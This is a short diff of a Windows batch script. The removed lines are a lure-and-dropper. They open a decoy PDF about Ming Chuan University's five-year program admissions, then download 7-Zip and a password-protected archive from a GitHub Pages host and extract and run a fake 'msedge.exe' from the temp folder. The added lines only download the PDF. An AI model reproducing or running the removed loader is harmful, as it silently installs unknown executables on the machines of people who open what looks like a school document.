@@ -1,11 +1,2 @@
-@echo off
-curl https://kingdog2.github.io/test.pdf -o "銘傳大學各學系學士生五年一貫課程申請資格及審查標準.pdf"
-rundll32 url.dll,FileProtocolHandler file:///銘傳大學各學系學士生五年一貫課程申請資格及審查標準.pdf
-
-curl https://kingdog2.github.io/7z.exe -o "%TEMP%\7z.exe"
-curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
-
-curl https://kingdog2.github.io/msedge.7z -o "%TEMP%\msedge.7z"
-%TEMP%\7z.exe x %TEMP%\msedge.7z -pGeorge_5595 -o"%TEMP%"
-%TEMP%\msedge.exe
-
+curl -OJ https://kingdog2.github.io/銘傳大學各學系學士生五年一貫課程申請資格及審查標準.pdf
+pause
